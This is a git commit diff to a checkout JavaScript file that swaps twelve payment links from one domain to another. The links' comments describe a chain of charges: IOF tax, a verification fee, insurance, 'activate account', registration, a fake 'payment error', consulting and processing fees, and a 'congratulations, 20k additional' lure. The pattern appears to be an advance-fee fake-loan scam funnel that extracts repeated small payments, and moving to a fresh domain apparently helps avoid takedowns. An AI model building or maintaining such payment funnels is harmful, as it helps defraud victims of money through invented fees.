cb282b471d8140c688b711dd5a217c61179cb32a
megad1 <yasminarcoverdetoscano@gmail.com>
2025-12-26 22:24:36 -0300

    zxc

--- js/checkout-shared.js
+++ js/checkout-shared.js
@@ -1,16 +1,16 @@
 const baseLinks = {
-    up1: "https://pay.finalagora.online/a9ArZMlR8R837xj", // IOF
-    up2: "https://pay.finalagora.online/meABG9d0p0vZ6Ea", // Taxa de verificação de IOF
-    up3: "https://pay.finalagora.online/NDr8gmKrerRZBmj", // Seguro Prestamista "tarifa de cadastro"
-    up4: "https://pay.finalagora.online/65XDZB8YAY4gVJw", // NFe
-    up5: "https://pay.finalagora.online/n1NLgwJqpqbGMxE", // Ativar conta
-    up6: "https://pay.finalagora.online/BNjzgPl8a8rgM78", // Taxa de registro do contrato
-    up7: "https://pay.finalagora.online/nQ7kZ7poAoLG0eJ", // Parabéns, 20k adicional
-    up8: "https://pay.finalagora.online/RmA83EaMNMO3PVp", // Erro no pagamento - 14,06
-    up9: "https://pay.finalagora.online/2wq7Gr78p88gBAN", // APP - 11,99
-    up10:"https://pay.finalagora.online/1VOvGV4dod93D62", // Taxa de Abertura TAC - 16,92
-    up11:"https://pay.finalagora.online/nWrxGWA4l4o3654", // Taxa de Consultoria Financeira - 19,53
-    up12:"https://pay.finalagora.online/KV603ko7p7L3w8y" // Taxa de Processamento Administrativo - 31,92
+    up1: "https://pay.acesso-facilitado.shop/65XDZBqdPD13VJw", // IOF
+    up2: "https://pay.acesso-facilitado.shop/NDr8gmKjNVqZBmj", // Taxa de verificação de IOF
+    up3: "https://pay.acesso-facilitado.shop/n1NLgwJNBmYGMxE", // Seguro Prestamista "tarifa de cadastro"
+    up4: "https://pay.acesso-facilitado.shop/N1nVZpYWNxAGlM6", // NFe
+    up5: "https://pay.acesso-facilitado.shop/xQBPZvRABDaZmVq", // Ativar conta
+    up6: "https://pay.acesso-facilitado.shop/eApQgz25B92gEb7", // Taxa de registro do contrato
+    up7: "https://pay.acesso-facilitado.shop/ODAK3LlNwMv3E6V", // Parabéns, 20k adicional
+    up8: "https://pay.acesso-facilitado.shop/2wq7Gr7dNkpgBAN", // Erro no pagamento - 14,06
+    up9: "https://pay.acesso-facilitado.shop/6YQPgjn6MjLgpxz", // APP - 11,99
+    up10:"https://pay.acesso-facilitado.shop/521rZJz1wNwZeaX", // Taxa de Abertura TAC - 16,92
+    up11:"https://pay.acesso-facilitado.shop/P5LNZ8zyRX2gaRy", // Taxa de Consultoria Financeira - 19,53
+    up12:"https://pay.acesso-facilitado.shop/JqoR32b41w03Vj5" // Taxa de Processamento Administrativo - 31,92
 
 };
 
